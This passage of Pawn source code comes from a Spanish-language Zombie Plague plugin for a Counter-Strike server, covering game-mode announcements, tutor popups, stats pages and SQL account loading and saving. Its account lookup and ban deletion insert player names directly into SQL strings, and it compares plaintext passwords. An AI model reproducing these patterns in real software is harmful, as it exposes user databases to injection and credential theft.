	{
		case MODE_SURVIVOR: formatex(sz_ModeName, charsmax(sz_ModeName), "survivor")
		case MODE_SWARM: formatex(sz_ModeName, charsmax(sz_ModeName), "swarm")
		case MODE_MULTI: formatex(sz_ModeName, charsmax(sz_ModeName), "infección multiple")
		case MODE_PLAGUE: formatex(sz_ModeName, charsmax(sz_ModeName), "plague")
		case MODE_ARMAGEDDON: formatex(sz_ModeName, charsmax(sz_ModeName), "armageddon")
		case MODE_SYNAPSIS: formatex(sz_ModeName, charsmax(sz_ModeName), "synapsis")
		case MODE_L4D: formatex(sz_ModeName, charsmax(sz_ModeName), "L4D")
		case MODE_WESKER: formatex(sz_ModeName, charsmax(sz_ModeName), "wesker")
		case MODE_NINJA: formatex(sz_ModeName, charsmax(sz_ModeName), "jason")
		case MODE_SNIPER: formatex(sz_ModeName, charsmax(sz_ModeName), "sniper")
		case MODE_TARINGA: formatex(sz_ModeName, charsmax(sz_ModeName), "Taringa!")
		case MODE_NEMESIS: formatex(sz_ModeName, charsmax(sz_ModeName), "nemesis")
		case MODE_TROLL: formatex(sz_ModeName, charsmax(sz_ModeName), "troll")
		case MODE_INFECTION: formatex(sz_ModeName, charsmax(sz_ModeName), "primer zombie")
	}
	
	switch(mode_times)
	{
		case 100: CC(0, "!g[ZP]!y Felicitaciones, el modo !g%s!y se jugó !g100 veces!y", sz_ModeName)
		default:
		{
			if(modo != MODE_INFECTION && mode_times % 500 == 0) CC(0, "!g[ZP]!y Felicitaciones, el modo !g%s!y se jugó !g%s veces!y", sz_ModeName, szDotModes)
			else if(mode_times % 2500 == 0) CC(0, "!g[ZP]!y Felicitaciones, el modo !g%s!y se jugó !g%s veces!y", sz_ModeName, szDotModes)
			else
			{
				CC(0, "!g[ZP]!y El modo !g%s!y se jugó !g%s veces!y", sz_ModeName, szDotModes)
				return PLUGIN_HANDLED;
			}
		}
	}
	
	CC(0, "!g[ZP]!y Todos los jugadores CONECTADOS ganaron !g10p. humanos y zombies!y")
	
	for( new i = 1; i <= g_maxplayers; i++ )
	{
		if( g_isconnected[i] && gLogeado[i] )
		{
			gPoints[i][HAB_HUMAN] += 10
			gPoints[i][HAB_ZOMBIE] += 10
		}
	}
	
	return PLUGIN_HANDLED;
}

public TutorCreate(id, szText[], iColor, Float:fTime, iTAN)
{
	if( id != 0 )
	{
		if( g_isconnected[id] && gLogeado[id] )
		{
			message_begin(MSG_ONE_UNRELIABLE, g_msgTutorText, _, id)
			write_string(szText)
			write_byte(0)
			write_short(0)
			write_short(0)
			write_short(1 << iColor)
			message_end()
			
			if(fTime != 0.0)
			{
				if(task_exists(id)) remove_task(id)
				set_task(fTime, "TutorClose", id)
			}
		}
	}
	else
	{
		for( new i = 1; i <= g_maxplayers; i++ )
		{
			if( g_isconnected[i] && gLogeado[i] )
			{
				message_begin(MSG_BROADCAST, g_msgTutorText, _, .player=id)
				if( equal(szText, "///TAN_R") || equal(szText, "///TAN_B") || equal(szText, "///TAN_Y") || equal(szText, "///TAN_G") )
				{
					if(get_user_flags(i) & ADMIN_RESERVATION )
					{
						if( iTAN ) write_string("ES T! AT NITE^n^nAmmoPacks: x6^nPuntos: x2")
						else write_string("AmmoPacks: x4^nPuntos: x2")
					}
					else
					{
						if( iTAN ) write_string("AmmoPacks: x3^nPuntos: x1")
						else write_string("AmmoPacks: x2^nPuntos: x1")
					}
				}
				else write_string(szText)
				write_byte(0)
				write_short(0)
				write_short(0)
				write_short(1 << iColor)
				message_end()
				
				if(fTime != 0.0)
				{
					if(task_exists(i)) remove_task(i)
					set_task(fTime, "TutorClose", i)
				}
			}
		}
	}
}
public TutorClose(id)
{
	if( g_isconnected[id] )
	{
		message_begin(MSG_BROADCAST, g_msgTutorClose, _, id)
		message_end()
	}
}

public zp_showhtml_motd(id, type_top)
{
	new buffer[1024], namebuffer[64];
	
	switch( type_top )
	{
		case TOP_GENERAL:
		{
			formatex(namebuffer, charsmax(namebuffer), "Top 15 - General")																						 
			formatex(buffer, charsmax(buffer), "<html><head><style>body {background:#000;color:#FFF;</style><meta http-equiv=^"Refresh^" content=^"0;url=http://www.taringacs.net/servidores/27025/top15.php^"></head><body><p>Cargando...</p></body></html>")
		}
		case TOP_MUERTES:
		{
			formatex(namebuffer, charsmax(namebuffer), "Top 15 - Muertes")																						 
			formatex(buffer, charsmax(buffer), "<html><head><style>body {background:#000;color:#FFF;</style><meta http-equiv=^"Refresh^" content=^"0;url=http://www.taringacs.net/servidores/27025/top15_muertes.php^"></head><body><p>Cargando...</p></body></html>")
		}
		case TOP_INFECCIONES:
		{
			formatex(namebuffer, charsmax(namebuffer), "Top 15 - Infecciones")																						 
			formatex(buffer, charsmax(buffer), "<html><head><style>body {background:#000;color:#FFF;</style><meta http-equiv=^"Refresh^" content=^"0;url=http://www.taringacs.net/servidores/27025/top15_infeccion.php^"></head><body><p>Cargando...</p></body></html>")
		}
		case TOP_DANIO:
		{
			formatex(namebuffer, charsmax(namebuffer), "Top 15 - Daño")																						 
			formatex(buffer, charsmax(buffer), "<html><head><style>body {background:#000;color:#FFF;</style><meta http-equiv=^"Refresh^" content=^"0;url=http://www.taringacs.net/servidores/27025/top15_danio.php^"></head><body><p>Cargando...</p></body></html>")
		}
	}
	
	show_motd(id, buffer, namebuffer)
}

/*public ShowInfo(id, message[], maxlen)
{
	format(message, maxlen, "%s", message);
	
	if(!id)
	{
		static players[32], num;
		get_players(players, num, "ch");
		for(new i = 0 ;i < num; i++)
		{
			message_begin(MSG_ONE_UNRELIABLE, get_user_msgid( "StatusText" ), {0,0,0}, id);
			write_byte(0);
			write_string(message);
			message_end();
		}
	}
	else
	{
		message_begin(MSG_ONE_UNRELIABLE, get_user_msgid( "StatusText" ), {0,0,0}, id); 
		write_byte(0); 
		write_string(message); 
		message_end(); 
	}
}*/

/*convert(data[], size_a, columns, output[], size_b)
{
	new col = power(10, columns - 1)
	new temp[4], num[19], i, j
	
	for (i = 0; i < size_a; i++)
	{
		new bool:complete
		
		for (j = col; j >= 10; j /= 10)
		{
			if (data[i] < j)
			{
				add(num, charsmax(num), "0")
			}
			else
			{
				num_to_str(data[i], temp, charsmax(temp))
				
				add(num, charsmax(num), temp)
				complete = true
				break;
			}	
		}

		if (!complete)
		{
			num_to_str(data[i], temp, charsmax(temp))			
			add(num, charsmax(num), temp)
		}	
	}
	
	copy(output, size_b, num)
}

unconvert(sznum[], size_a, nums, output[])
{
	new i, j, k, col = size_a / nums
	new temp[4]
	
	for (i = 0; i < nums; i++)
	{
		new end = i * col
		
		for (j = end, k = 0; j < end + col; j++)
		{
			temp[k++] = sznum[j]
		}
		
		output[i] = str_to_num(temp)
	}
}*/

/*#include <amxmodx>
#include <engine>

#define PLUGIN "Nuevo Plugin"
#define VERSION "0.1"
#define AUTHOR "meTaLiCroSS"


public plugin_init() 
{
	register_plugin(PLUGIN, VERSION, AUTHOR)
	
	register_clcmd("say /bola", "clcmd_CreateBall")
	
	register_think("func_customball", "fw_CustomBall_Think")
}

public plugin_precache() 	precache_model("sprites/mommaspit.spr")

public clcmd_CreateBall(iId)
{
	new iBall = create_entity("env_sprite")
	
	entity_set_string(iBall, EV_SZ_classname, "func_customball")
	entity_set_model(iBall, "sprites/mommaspit.spr")
	entity_set_size(iBall, Float:{-0.0, -0.0, -0.0}, Float:{0.0, 0.0, 0.0})
	
	entity_set_float(iBall, EV_FL_scale, 0.5)
	entity_set_float(iBall, EV_FL_framerate, 5.0)
	entity_set_float(iBall, EV_FL_nextthink, get_gametime())
	
	entity_set_int(iBall, EV_INT_solid, SOLID_NOT)
	entity_set_int(iBall, EV_INT_spawnflags, SF_SPRITE_STARTON)
	entity_set_int(iBall, EV_INT_movetype, MOVETYPE_FLY)
	
	entity_set_edict(iBall, EV_ENT_owner, iId)
	
	new Float:vecStart[3]
	entity_get_vector(iId, EV_VEC_origin, vecStart)
	entity_set_origin(iBall, vecStart)
	
	set_rendering(iBall, kRenderFxNone, 240, 0, 0, kRenderTransAdd, 255) // color
}

public fw_CustomBall_Think(iEnt)
{
	if(!is_valid_ent(iEnt))
		return;
		
	static Float:flScale
	flScale = entity_get_float(iEnt, EV_FL_scale)
	
	if(flScale >= 50.0) // un ejemplo de numero, ajustalo a tu precision
	{
		remove_entity(iEnt)
		return;
	}
	
	entity_set_float(iEnt, EV_FL_scale, flScale + 0.1)
	entity_set_float(iEnt, EV_FL_nextthink, get_gametime())
}
*/

public CheckAccount( id )
{
	if(!is_user_connected(id))
		return PLUGIN_HANDLED;
	
	new Handle:SQL_CONSULTA = SQL_PrepareQuery( SQL_CONNECTION, "SELECT * FROM accounts \
	LEFT JOIN bans on bans.zp_id = accounts.id \
	WHERE accounts.name = ^"%s^";", g_playername[id] )
	
	if( !SQL_Execute( SQL_CONSULTA ) )
	{
		server_cmd( "kick #%d ^"ERROR_1: CONSULTA RECHAZADA^"", get_user_userid(id) )
		
		SQL_FreeHandle( SQL_CONSULTA )
		
		return PLUGIN_HANDLED;
	}
	else if( SQL_NumResults( SQL_CONSULTA ) )
	{
		/// |========|
		/// |  BANS  |
		/// |========|
		new iExpiredBan = SQL_ReadResult( SQL_CONSULTA, 41 )
		
		if(iExpiredBan > 0)
		{
			new iActualTime = ( get_systime( ) + ( -3 * gHOUR_SECONDS ) )
			new iDifference = iExpiredBan - iActualTime
			
			if( iDifference <= 0 )
			{
				CC(0, "!g[ZP]!y El baneo de la cuenta !g%s!y ha expirado, ya puede volver a jugar", g_playername[id])
				SQL_QueryAndIgnore( SQL_CONNECTION, "DELETE FROM `bans` WHERE `name` = ^"%s^";", g_playername[id] )
			}
			else
			{
				server_cmd( "kick #%d ^"Se ha producido un error en su cuenta^"", get_user_userid(id) )
		
				SQL_FreeHandle( SQL_CONSULTA )
				
				return PLUGIN_HANDLED;
			}
		}
		
		new SQL_Password[33], SQL_Ip[32];
		new szPassword[32], szIp[32];
		
		zp_id[id] = SQL_ReadResult( SQL_CONSULTA, 0 )
		
		SQL_ReadResult( SQL_CONSULTA, 2, SQL_Password, 31 )
		SQL_ReadResult( SQL_CONSULTA, 3, SQL_Ip, 31 )
		
		gRecordVinc[id] = SQL_ReadResult( SQL_CONSULTA, 4 )
		
		get_user_info( id, "zpt", szPassword, 31 )
		get_user_ip( id, szIp, 31, 1 )
		
		gRegistrado[id] = 1
		
		if( equali( SQL_Ip, szIp ) && equali( SQL_Password, szPassword ) )
		{
			gLogeado[id] = 1
		
			/// |=========|
			/// |  DATES  |
			/// |=========|
			g_ammopacks[id] = SQL_ReadResult( SQL_CONSULTA, 5 )
			gLevel[id] = SQL_ReadResult( SQL_CONSULTA, 6 )
			gReset[id] = SQL_ReadResult( SQL_CONSULTA, 7 )
			
			switch(gReset[id])
			{
				case 0: gAP_Percent[id] = DEF_AP_PERCENT
				case 1: gAP_Percent[id] = ( ( float(g_ammopacks[id]) - float(gAMMOPACKS_NEEDED_RESET(gLevel[id]-1)) ) * 100.0 ) / ( float(gAMMOPACKS_NEEDED_RESET(gLevel[id])) - float(gAMMOPACKS_NEEDED_RESET(gLevel[id]-1)) )
				case 2..3: gAP_Percent[id] = gAP_Percent[id] = ( ( float(g_ammopacks[id]) - float(gAMMOPACKS_NEEDED_RESET_2(gLevel[id]-1)) ) * 100.0 ) / ( float(gAMMOPACKS_NEEDED_RESET_2(gLevel[id])) - float(gAMMOPACKS_NEEDED_RESET_2(gLevel[id]-1)) )
				case 4..9999: gAP_Percent[id] = ( ( float(g_ammopacks[id]) - float(gAMMOPACKS_NEEDED_RESET_4(gLevel[id]-1)) ) * 100.0 ) / ( float(gAMMOPACKS_NEEDED_RESET_4(gLevel[id])) - float(gAMMOPACKS_NEEDED_RESET_4(gLevel[id]-1)) )
			}
			
			// Parse points
			new szPoints[64], szPointsHZSNE[MAX_HAB][12];
			new a = 0;
			
			SQL_ReadResult( SQL_CONSULTA, 8, szPoints, 63 )
			parse( szPoints, szPointsHZSNE[HAB_HUMAN], 11, szPointsHZSNE[HAB_ZOMBIE], 11, szPointsHZSNE[HAB_SURVIVOR], 11, szPointsHZSNE[HAB_NEMESIS], 11, szPointsHZSNE[HAB_SPECIAL], 11 )
			
			for(a = 0; a < MAX_HAB; a++) 
				gPoints[id][a] = str_to_num( szPointsHZSNE[a] )
			
			// Parse habilities - Humans
			new szHabilities[32], szHabH[MAX_SPECIAL_HABILITIES][6];
			
			SQL_ReadResult( SQL_CONSULTA, 9, szHabilities, 31 )
			parse( szHabilities, szHabH[0], 5, szHabH[1], 5, szHabH[2], 5, szHabH[3], 5, szHabH[4], 5 )
			
			for(a = 0; a < MAX_SPECIAL_HABILITIES; a++)
				g_hab[id][HAB_HUMAN][a] = str_to_num( szHabH[a] )
			
			// Habilities - Zombies
			SQL_ReadResult( SQL_CONSULTA, 10, szHabilities, 31 )
			parse( szHabilities, szHabH[0], 5, szHabH[1], 5, szHabH[2], 5, szHabH[3], 5, szHabH[4], 5 )
			
			for(a = 0; a < MAX_SPECIAL_HABILITIES; a++)
				g_hab[id][HAB_ZOMBIE][a] = str_to_num( szHabH[a] )
			
			// Habilities - Survivors
			SQL_ReadResult( SQL_CONSULTA, 11, szHabilities, 31 )
			parse( szHabilities, szHabH[0], 5, szHabH[1], 5, szHabH[2], 5, szHabH[3], 5, szHabH[4], 5 )
			
			for(a = 0; a < MAX_SPECIAL_HABILITIES; a++)
				g_hab[id][HAB_SURVIVOR][a] = str_to_num( szHabH[a] )
			
			// Habilities - Nemesis
			SQL_ReadResult( SQL_CONSULTA, 12, szHabilities, 31 )
			parse( szHabilities, szHabH[0], 5, szHabH[1], 5, szHabH[2], 5, szHabH[3], 5, szHabH[4], 5 )
			
			for(a = 0; a < MAX_SPECIAL_HABILITIES; a++)
				g_hab[id][HAB_NEMESIS][a] = str_to_num( szHabH[a] )
			
			// Habilities - Specials
			SQL_ReadResult( SQL_CONSULTA, 13, szHabilities, 31 )
			parse( szHabilities, szHabH[4], 5, szHabH[6], 5, szHabH[7], 5, szHabH[5], 5 )
			
			g_hab[id][HAB_SPECIAL][5] = str_to_num( szHabH[5] )
			g_hab[id][HAB_SPECIAL][6] = str_to_num( szHabH[6] )
			g_hab[id][HAB_SPECIAL][7] = str_to_num( szHabH[7] )
			
			// Zombie & Human Class
			g_zombieclassnext[id] = SQL_ReadResult( SQL_CONSULTA, 14 )
			g_zombieclass[id] = SQL_ReadResult( SQL_CONSULTA, 14 )
			g_humanclassnext[id] = SQL_ReadResult( SQL_CONSULTA, 15 )
			g_humanclass[id] = SQL_ReadResult( SQL_CONSULTA, 15 )
			
			// Parse record weapons
			new szWeapons[32], szWeaponAutoOn[8], szWeaponPrimary[8], szWeaponSecondary[8], szWeaponTerciary[8];
			
			SQL_ReadResult( SQL_CONSULTA, 16, szWeapons, 31 )
			parse( szWeapons, szWeaponAutoOn, 7, szWeaponPrimary, 7, szWeaponSecondary, 7, szWeaponTerciary, 7 )
			
			g_menu_data[id][2] = str_to_num( szWeaponAutoOn )
			g_menu_data[id][3] = str_to_num( szWeaponPrimary )
			g_menu_data[id][4] = str_to_num( szWeaponSecondary )
			g_menu_data[id][6] = str_to_num( szWeaponTerciary )
			
			// Parse record grenades
			new szGrenades[32], szGrenadeInfection[8], szGrenadeNapalm[8], szGrenadeFrost[8], szGrenadeSuperNova[8];
			
			SQL_ReadResult( SQL_CONSULTA, 17, szGrenades, 31 )
			parse( szGrenades, szGrenadeInfection, 7, szGrenadeNapalm, 7, szGrenadeFrost, 7, szGrenadeSuperNova, 7 )
			
			gImpact[id][GRENADE_INFECTION] = str_to_num( szGrenadeInfection )
			gImpact[id][GRENADE_NAPALM] = str_to_num( szGrenadeNapalm )
			gImpact[id][GRENADE_FROST] = str_to_num( szGrenadeFrost )
			gImpact[id][GRENADE_SUPERNOVA] = str_to_num( szGrenadeSuperNova )
			
			
			/// |=============|
			/// |  DATES SEC  |
			/// |=============|
			SQL_QueryAndIgnore( SQL_CONNECTION, "UPDATE `accounts` SET `last_connect` = now() WHERE `id` = '%d';", zp_id[id] )
			
			gDmgEcho[id] = SQL_ReadResult( SQL_CONSULTA, 20 )
			gDmgRec[id] = SQL_ReadResult( SQL_CONSULTA, 21 )
			
			gKills[id] = SQL_ReadResult( SQL_CONSULTA, 22 )
			gKillsRec[id] = SQL_ReadResult( SQL_CONSULTA, 23 )
			
			gInfects[id] = SQL_ReadResult( SQL_CONSULTA, 24 )
			gInfectsRec[id] = SQL_ReadResult( SQL_CONSULTA, 25 )
			
			// Parse colors
			new szNVG_HUD[32], szNVG_RGB[3][4], szHUD_RGB[3][4];
			
			SQL_ReadResult( SQL_CONSULTA, 26, szNVG_HUD, 31 )
			parse( szNVG_HUD, szNVG_RGB[0], 3, szNVG_RGB[1], 3, szNVG_RGB[2], 3, szHUD_RGB[0], 3, szHUD_RGB[1], 3, szHUD_RGB[2], 3 )
			
			for(a = 0; a < 3; a++)
			{
				g_color_nvg[id][a] = str_to_num( szNVG_RGB[a] )
				g_color_hud[id][a] = str_to_num( szHUD_RGB[a] )
			}
			
			// Parse hud position
			new szHUD_XYC[32], szHUD_X[6], szHUD_Y[6], szHUD_C[6];
			
			SQL_ReadResult( SQL_CONSULTA, 27, szHUD_XYC, 31 )
			parse( szHUD_XYC, szHUD_X, 5, szHUD_Y, 5, szHUD_C, 5 )
			
			g_hud_xyc[id][0] = str_to_float( szHUD_X )
			g_hud_xyc[id][1] = str_to_float( szHUD_Y )
			g_hud_xyc[id][2] = str_to_float( szHUD_C )
			
			gMaxCombo[id] = SQL_ReadResult( SQL_CONSULTA, 28 )
			
			
			/// |=============|
			/// |  DATES TER  |
			/// |=============|
			gApost[id][0] = SQL_ReadResult( SQL_CONSULTA, 29 )
			gApost[id][1] = SQL_ReadResult( SQL_CONSULTA, 30 )
			
			if(gApost[id][0] > 450)
			{
				gApostG[id][0] = gApost[id][0]
				gApostG[id][1] = gApost[id][1]
				
				gYaAposto[id] = 1;
			}
			
			
			/// |=============|
			/// |  DATES CUA  |
			/// |=============|
			gBombaMax[id] = SQL_ReadResult( SQL_CONSULTA, 31 )
			gFuriaMax[id] = SQL_ReadResult( SQL_CONSULTA, 32 )
			
			gViewInvisible[id] = SQL_ReadResult( SQL_CONSULTA, 33 )
			
			
			/// |==========|
			/// |  LOGROS  |
			/// |==========|
			// Parse logros
			new szLogros[128], szParseLogros[128];
			
			SQL_ReadResult( SQL_CONSULTA, 34, szLogros, 127 )
			parse( szLogros, szParseLogros, 127 )
			
			if(szParseLogros[0] == 'h' && szParseLogros[1] == '1') g_logro[id][LOGRO_HUMAN][KILL_15_1_ROUND] = 1;
			if(szParseLogros[2] == 'h' && szParseLogros[3] == '2') g_logro[id][LOGRO_HUMAN][KILL_25_1_ROUND] = 1;
			
			if(szParseLogros[4] == 'h' && szParseLogros[5] == '3') g_logro[id][LOGRO_HUMAN][A_DONDE_VAS] = 1;
			
			if(szParseLogros[6] == 'h' && szParseLogros[7] == '4') g_logro[id][LOGRO_HUMAN][A_CUCHILLO] = 1;
			if(szParseLogros[8] == 'h' && szParseLogros[9] == '5') g_logro[id][LOGRO_HUMAN][AFILANDO_CUCHILLOS] = 1;
			
			if(szParseLogros[12] == 'h' && szParseLogros[13] == '7') g_logro[id][LOGRO_HUMAN][CONTADOR_DE_DANIOS] = 1;
			if(szParseLogros[14] == 'h' && szParseLogros[15] == '8') g_logro[id][LOGRO_HUMAN][MORIRE_EN_EL_INTENTO] = 1;
			
			if(szParseLogros[16] == 'z' && szParseLogros[17] == '1') g_logro[id][LOGRO_ZOMBIE][LA_BOMBA_VERDE] = 1;
			if(szParseLogros[18] == 'z' && szParseLogros[19] == '2') g_logro[id][LOGRO_ZOMBIE][NO_ME_VEZ] = 1;
			if(szParseLogros[20] == 'z' && szParseLogros[21] == '3') g_logro[id][LOGRO_ZOMBIE][SOY_EL_ZOMBIE] = 1;
			if(szParseLogros[22] == 'z' && szParseLogros[23] == '4') g_logro[id][LOGRO_ZOMBIE][ASI_NO_VA] = 1;
			
			// Logros - Humans
			new i_Count[2] = { 0, 0 };
			
			for(new x = 0; x < MAX_SPECIAL_HABILITIES; x++)
			{
				if(g_hab[id][HAB_HUMAN][x] >= MAX_HAB_LEVEL[0][x])
					i_Count[0]++;
				
				if(g_hab[id][HAB_ZOMBIE][x] >= MAX_HAB_LEVEL[1][x])
					i_Count[1]++;
			}
			if(i_Count[0] >= MAX_SPECIAL_HABILITIES) g_logro[id][LOGRO_HUMAN][FULL_HAB_H] = 1;
			if(i_Count[1] >= MAX_SPECIAL_HABILITIES) g_logro[id][LOGRO_ZOMBIE][FULL_HAB_Z] = 1;
			
			if(gMaxCombo[id] >= 2500)
			{
				g_logro[id][LOGRO_HUMAN][COMBO_2500] = 1;
				
				if(gMaxCombo[id] >= 5000)
				{
					g_logro[id][LOGRO_HUMAN][COMBO_5000] = 1;
					
					if(gMaxCombo[id] >= 10000)
						g_logro[id][LOGRO_HUMAN][COMBO_10000] = 1;
				}
			}
			
			if(gKills[id] >= 20000)
			{
				g_logro[id][LOGRO_HUMAN][KILL_20000] = 1;
				
				if(gKills[id] >= 50000) 
				{
					g_logro[id][LOGRO_HUMAN][KILL_50000] = 1;
					
					if(gKills[id] >= 100000) 
						g_logro[id][LOGRO_HUMAN][KILL_100000] = 1;
				}
			}
			
			if(gReset[id] > 0) g_logro[id][LOGRO_HUMAN][RESET] = 1;
			
			// Logros - Zombies
			if(i_Count[1] >= MAX_SPECIAL_HABILITIES) g_logro[id][LOGRO_ZOMBIE][FULL_HAB_Z] = 1;
			
			if(gInfects[id] >= 10000)
			{
				g_logro[id][LOGRO_ZOMBIE][INFECT_10000] = 1;
				
				if(gInfects[id] >= 30000) 
				{
					g_logro[id][LOGRO_ZOMBIE][INFECT_30000] = 1;
					
					if(gInfects[id] >= 100000) 
						g_logro[id][LOGRO_ZOMBIE][INFECT_100000] = 1;
				}
			}
		}
		else
		{
			// LOGIN
			client_cmd(id, "chooseteam")
			set_task(0.1, "clcmd_changeteam", id)
		}
	}
	
	SQL_FreeHandle( SQL_CONSULTA )
	return PLUGIN_HANDLED;
}
public TASK_SaveDates( id ) SaveDates(id, 1, 1, 0)
public TASK_Vinc(id) if( !gRecordVinc[id] ) CC(id, "!g[ZP]!y Recordá vincular tu cuenta de Taringa! CS con la del Zombie-Plague para disfrutar 100%% del servidor!")
public SaveDates( id, primarios, secundarios, terciarios )
{
	if( is_user_bot(id) || is_user_hltv(id) || !gLogeado[id] || !is_user_connected(id) )
		return PLUGIN_HANDLED;
	
	if( primarios )
	{
		new szPointsHZ[64], szHabsH[32], szHabsZ[32], szHabsS[32], szHabsN[32], szHabsE[32], szRecordWeapons[32], szRecordGrenades[32];
		formatex( szPointsHZ, charsmax(szPointsHZ), "%d %d %d %d %d", gPoints[id][HAB_HUMAN], gPoints[id][HAB_ZOMBIE], gPoints[id][HAB_SURVIVOR], gPoints[id][HAB_NEMESIS], gPoints[id][HAB_SPECIAL] )
		formatex( szHabsH, charsmax(szHabsH), "%d %d %d %d %d", g_hab[id][HAB_HUMAN][0], g_hab[id][HAB_HUMAN][1], g_hab[id][HAB_HUMAN][2], g_hab[id][HAB_HUMAN][3], g_hab[id][HAB_HUMAN][4] )
		formatex( szHabsZ, charsmax(szHabsZ), "%d %d %d %d %d", g_hab[id][HAB_ZOMBIE][0], g_hab[id][HAB_ZOMBIE][1], g_hab[id][HAB_ZOMBIE][2], g_hab[id][HAB_ZOMBIE][3], g_hab[id][HAB_ZOMBIE][4] )
		formatex( szHabsS, charsmax(szHabsS), "%d %d %d %d %d", g_hab[id][HAB_SURVIVOR][0], g_hab[id][HAB_SURVIVOR][1], g_hab[id][HAB_SURVIVOR][2], g_hab[id][HAB_SURVIVOR][3], g_hab[id][HAB_SURVIVOR][4] )
		formatex( szHabsN, charsmax(szHabsN), "%d %d %d %d %d", g_hab[id][HAB_NEMESIS][0], g_hab[id][HAB_NEMESIS][1], g_hab[id][HAB_NEMESIS][2], g_hab[id][HAB_NEMESIS][3], g_hab[id][HAB_NEMESIS][4] )
		formatex( szHabsE, charsmax(szHabsE), "0 %d %d %d", g_hab[id][HAB_SPECIAL][6], g_hab[id][HAB_SPECIAL][7], g_hab[id][HAB_SPECIAL][5] )
		formatex( szRecordWeapons, charsmax(szRecordWeapons), "%d %d %d %d", g_menu_data[id][2], g_menu_data[id][3], g_menu_data[id][4], g_menu_data[id][6] )
		formatex( szRecordGrenades, charsmax(szRecordGrenades), "%d %d %d %d", gImpact[id][GRENADE_INFECTION], gImpact[id][GRENADE_NAPALM], gImpact[id][GRENADE_FROST], gImpact[id][GRENADE_SUPERNOVA] )
		
		SQL_QueryAndIgnore( SQL_CONNECTION, "UPDATE `accounts` SET `ammopacks` = '%d', `level` = '%d', `reset` = '%d', `pointshz` = '%s', \
		`habsh` = '%s', `habsz` = '%s', `habss` = '%s', `habsn` = '%s', `habse` = '%s', `classzombie` = '%d', `classhuman` = '%d', `record_weapons` = '%s', `record_grenades` = '%s' WHERE `id` = '%d';", g_ammopacks[id], 
		gLevel[id], gReset[id], szPointsHZ, szHabsH, szHabsZ, szHabsS, szHabsN, szHabsE, g_zombieclassnext[id], g_humanclassnext[id], szRecordWeapons, szRecordGrenades, zp_id[id] )
	}
	if( secundarios )
	{
		new szNVG_HUD[32], szHUD_XYC[32];
		formatex( szNVG_HUD, charsmax(szNVG_HUD), "%d %d %d %d %d %d", g_color_nvg[id][0], g_color_nvg[id][1], g_color_nvg[id][2], g_color_hud[id][0], g_color_hud[id][1], g_color_hud[id][2] )
		formatex( szHUD_XYC, charsmax(szHUD_XYC), "%.2f %.2f %.2f", g_hud_xyc[id][0], g_hud_xyc[id][1], g_hud_xyc[id][2] )
		
		SQL_QueryAndIgnore( SQL_CONNECTION, "UPDATE `accounts` SET `dmg_echo` = '%d', `dmg_rec` = '%d', `kills` = '%d', \
		`kills_rec` = '%d', `infects_echas` = '%d', `infects_rec` = '%d', `nvg_hud_rgb` = '%s', `hud_coord_cart_xy` = '%s', `combos` = '%d' WHERE `id` = '%d';", 
		gDmgEcho[id], gDmgRec[id], gKills[id], gKillsRec[id], gInfects[id], gInfectsRec[id], szNVG_HUD, szHUD_XYC, gMaxCombo[id], zp_id[id] )
	}
	if( terciarios )
	{
		new szLogros[128];
		formatex( szLogros, charsmax(szLogros), "%s%s%s%s%sh0%s%s%s%s%s%s", g_logro[id][LOGRO_HUMAN][KILL_15_1_ROUND] ? "h1" : "h0",
		g_logro[id][LOGRO_HUMAN][KILL_25_1_ROUND] ? "h2" : "h0",
		g_logro[id][LOGRO_HUMAN][A_DONDE_VAS] ? "h3" : "h0",
		g_logro[id][LOGRO_HUMAN][A_CUCHILLO] ? "h4" : "h0",
		g_logro[id][LOGRO_HUMAN][AFILANDO_CUCHILLOS] ? "h5" : "h0",
		g_logro[id][LOGRO_HUMAN][CONTADOR_DE_DANIOS] ? "h7" : "h0",
		g_logro[id][LOGRO_HUMAN][MORIRE_EN_EL_INTENTO] ? "h8" : "h0",
		
		g_logro[id][LOGRO_ZOMBIE][LA_BOMBA_VERDE] ? "z1" : "z0",
		g_logro[id][LOGRO_ZOMBIE][NO_ME_VEZ] ? "z2" : "z0",
		g_logro[id][LOGRO_ZOMBIE][SOY_EL_ZOMBIE] ? "z3" : "z0",
		g_logro[id][LOGRO_ZOMBIE][ASI_NO_VA] ? "z4" : "z0" )
	
		SQL_QueryAndIgnore( SQL_CONNECTION, "UPDATE `accounts` SET `bomba_inf` = '%d', `furia_zom` = '%d', `inv` = '%d', `logros` = '%s' WHERE `id` = '%d';",
		gBombaMax[id], gFuriaMax[id], gViewInvisible[id], szLogros, zp_id[id] )
	}
	
	return PLUGIN_HANDLED;
}

fnUpdateLogros(id, logro_class, logro)
{
	if(is_user_connected(id) && gLogeado[id])
	{
		if(!g_logro[id][logro_class][logro])
		{
			g_logro[id][logro_class][logro] = 1;
			
			new i_Reward = ArrayGetCell(A_LOGROS_POINTS[logro_class], logro);
			
			CC(0, "!g[ZP] %s!y ha conseguido el logro: !g%s!y (!g%dp.!y)", g_playername[id], LANG_LOGROS_NAMES[logro_class][logro], i_Reward);
			
			gPoints[id][HAB_SPECIAL] += i_Reward;
		}
	}
}

public FinishArmageddonInit() g_armageddon_init = 0;